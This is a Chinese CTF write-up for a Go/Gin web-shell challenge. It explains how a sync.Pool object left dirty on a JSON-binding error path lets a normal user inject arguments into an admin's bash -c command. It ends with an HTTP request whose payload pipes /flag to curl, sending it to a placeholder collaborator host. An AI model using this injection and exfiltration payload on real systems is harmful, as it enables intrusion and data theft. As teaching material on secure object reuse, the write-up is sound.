# My Monitor

## 题目简述

题面说 NaCl 写了一个简易 WebShell，管理员会隔一段时间输入 `ls`。附件是 Go/Gin 源码，路由分为 `/api/user/cmd` 和 `/api/admin/cmd`，两者共用 `sync.Pool` 里的 `MonitorStruct`。

```go
type MonitorStruct struct {
    Cmd  string `json:"cmd" binding:"required"`
    Args string `json:"args"`
}

var MonitorPool = &sync.Pool{New: func() any { return &MonitorStruct{} }}
```

用户命令接口在 JSON 绑定失败时直接返回，没有清空对象；管理员接口会把 `Cmd` 和 `Args` 拼成 shell 命令执行。

```go
func UserCmd(c *gin.Context) {
    monitor := MonitorPool.Get().(*MonitorStruct)
    defer MonitorPool.Put(monitor)
    if err := c.ShouldBindJSON(monitor); err != nil {
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }
    defer monitor.reset()
    if monitor.Cmd != "status" { ... }
}

func AdminCmd(c *gin.Context) {
    monitor := MonitorPool.Get().(*MonitorStruct)
    defer MonitorPool.Put(monitor)
    c.ShouldBindJSON(monitor)
    fullCommand := fmt.Sprintf("%s %s", monitor.Cmd, monitor.Args)
    exec.Command("bash", "-c", fullCommand).CombinedOutput()
}
```

## 解题过程

`UserCmd` 的错误路径是漏洞入口：如果 `ShouldBindJSON` 触发错误，函数会直接返回，`defer MonitorPool.Put(monitor)` 仍会把对象放回池中，但 `monitor.reset()` 没有执行。

```go
func UserCmd(c *gin.Context) {
    monitor := MonitorPool.Get().(*MonitorStruct)
    defer MonitorPool.Put(monitor)
    if err := c.ShouldBindJSON(monitor); err != nil {
        fmt.Println(monitor)
        c.JSON(400, gin.H{"error": err.Error()})
        return
    }
    fmt.Println(monitor)
    defer monitor.reset()
    if monitor.Cmd != "status" {
        c.JSON(403, gin.H{"response": "No permission to execute this command"})
        return
    }
    c.JSON(400, gin.H{"response": "Not implemented yet :("})
    return
}
```

前端逻辑中，如果没有填写 `args`，只会发送含有 `cmd` 的 JSON：

```javascript
    ......
    const payload = { cmd };
    if (args) {
        payload.args = args;
    }
    ......
```

Gin 的 `ShouldBindJSON` 会把匹配到的字段写入传入的结构体指针，而不是先创建临时结构体再整体替换。因此可以构造只有 `args`、缺少必填 `cmd` 的请求：绑定时 `Args` 被写入对象，随后因 `Cmd` 缺失报错，带污染 `Args` 的对象回到 `sync.Pool`。

管理员定时执行 `ls` 时，管理员接口可能从同一个对象池取到被污染的对象。它只覆盖了 `Cmd`，没有清理残留 `Args`，随后把两者拼接进 `bash -c`：

```go
    fullCommand := fmt.Sprintf("%s %s", monitor.Cmd, monitor.Args)
    output, err := exec.Command("bash", "-c", fullCommand).CombinedOutput()
```

综上，普通用户先发送只含 `args` 的请求污染对象池；当管理员输入 `ls` 时，残留 `args` 会被拼到 `ls` 后面，实现命令注入。实际利用时只需要保留普通用户登录态和最小 JSON body：

```http
POST /api/user/cmd HTTP/1.1
Content-Type: application/json
Authorization: <normal-user-token>

{"args":"&& cat /flag | curl -d @- https://your-collaborator-endpoint/collect"}
```
## 方法总结

看到对象池、结构体复用和 JSON bind 时，要检查错误路径是否清空旧字段。若用户与管理员共享对象池或缓存，低权限请求可通过残留字段影响高权限逻辑；命令拼接处再出现 `bash -c` 时，残留参数就能变成命令执行。
